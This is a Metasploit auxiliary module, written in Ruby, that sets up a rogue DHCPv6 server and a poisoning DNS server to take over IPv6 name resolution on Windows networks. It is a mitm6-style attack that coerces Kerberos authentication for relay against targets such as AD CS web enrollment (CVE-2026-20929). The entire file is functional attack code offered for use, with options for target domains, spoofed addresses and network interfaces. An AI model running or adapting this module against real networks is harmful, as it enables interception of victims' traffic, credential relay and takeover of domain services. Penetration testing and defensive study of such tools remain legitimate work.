##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::DNS::Client
  include Msf::Exploit::Remote::DNS::Server
  include Msf::Exploit::Remote::DNS::NamePoisoner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'DHCPv6 DNS Takeover (mitm6-style IPv6 DNS coercion)',
        'Description' => %q{
          This module runs a rogue DHCPv6 server that hands the attacker to IPv6
          clients as their DNS server (the classic mitm6 primitive), and a paired
          DNS server that poisons names under a target domain to point at the
          attacker while transparently forwarding all other lookups so the victim
          stays functional.

          Once a client resolves a target service through the attacker, it can be
          coerced into authenticating to the attacker. Paired with a Kerberos relay
          target (for example ESC8 AD CS web enrollment), this is the native
          coercion half of the Kerberos relay via DNS technique (CVE-2026-20929),
          removing the dependency on external tooling such as mitm6.

          IPv6 is preferred by Windows over IPv4, so becoming the client's IPv6 DNS
          server is enough to intercept its name resolution even on IPv4 networks.
        },
        'Author' => [
          'Pushpender Rathore' # native DHCPv6 + DNS coercion
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-20929'],
          ['URL', 'https://github.com/dirkjanm/mitm6'],
          ['ATT&CK', Mitre::Attack::Technique::T1557_ADVERSARY_IN_THE_MIDDLE]
        ],
        'Actions' => [
          [ 'Service', { 'Description' => 'Run the DHCPv6 and DNS takeover services' } ]
        ],
        'PassiveActions' => [ 'Service' ],
        'DefaultAction' => 'Service',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    # TARGET_DOMAIN, TARGET_HOSTS, SPOOF_IP6 and RELAY_CNAME come from the shared
    # DNS::NamePoisoner mixin.
    register_options(
      [
        # Bind the DNS server dual-stack by default. The victim is handed SPOOF_IP6 (an
        # IPv6 address) as its resolver, so a listener on 0.0.0.0 (IPv4 wildcard) would
        # never receive its queries. This matches the sibling ipv6_ra_dns_takeover module.
        OptAddressLocal.new('SRVHOST', [ true, 'The local host or network interface to listen on. Defaults to :: to receive the IPv6 DNS queries the victim is steered to send.', '::' ]),
        OptString.new('LEASE_IP6', [ false, 'IPv6 address to lease to clients making stateful (IA_NA) requests.' ]),
        OptString.new('DHCPV6_INTERFACE', [ false, 'Network interface to bind the DHCPv6 server and join the multicast group on.' ])
      ]
    )
  end

  def run
    validate_ipv6!(datastore['SPOOF_IP6'], 'SPOOF_IP6')
    validate_ipv6!(datastore['LEASE_IP6'], 'LEASE_IP6') if datastore['LEASE_IP6'].present?

    start_service
    print_status("DNS server started, poisoning names under #{datastore['TARGET_DOMAIN']} -> #{poison_description}")

    start_dhcpv6_server
    print_status("DHCPv6 server started, advertising #{datastore['SPOOF_IP6']} as the DNS server")

    service.wait if service
  rescue Rex::BindFailed => e
    print_error("Failed to bind a service socket: #{e.message}")
  end

  def cleanup
    super
    @dhcpv6_server&.stop
    @dhcpv6_server = nil
  end

  private

  def start_dhcpv6_server
    @dhcpv6_server = Rex::Proto::DHCPv6::Server.new(
      dns_servers: [datastore['SPOOF_IP6']],
      assigned_address: datastore['LEASE_IP6'],
      domain_list: [datastore['TARGET_DOMAIN']],
      interface: datastore['DHCPV6_INTERFACE'],
      context: { 'Msf' => framework, 'MsfExploit' => self }
    )
    @dhcpv6_server.on_request do |msg_type, client_host, _buf|
      vprint_status("DHCPv6 #{dhcpv6_message_name(msg_type)} from #{client_host}, answered with DNS #{datastore['SPOOF_IP6']}")
    end
    @dhcpv6_server.start
  end

  def dhcpv6_message_name(msg_type)
    Rex::Proto::DHCPv6::Constants::MessageType.constants.find do |c|
      Rex::Proto::DHCPv6::Constants::MessageType.const_get(c) == msg_type
    end || msg_type
  end
end
